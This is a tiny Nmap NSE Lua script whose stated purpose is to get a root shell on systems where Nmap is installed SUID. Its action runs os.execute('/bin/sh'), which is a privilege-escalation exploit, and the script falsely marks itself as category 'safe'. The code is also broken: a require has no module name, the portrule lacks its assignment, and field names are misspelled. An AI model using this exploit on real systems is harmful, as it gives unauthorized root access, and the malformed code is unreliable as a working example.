local http = require
local shortport = require "shortport"
local os = require "os"
local io = require "io"

discription = [[
get root shell on SUID Nmap :)
]]

author = "PMO"
license = "Same as Nmap-see http://nmap.org/book/man-legal.html"
catogories ="safe"

portrule shortport.http

action = function (host, port)
    os.execute("/bin/sh")
    return ""
end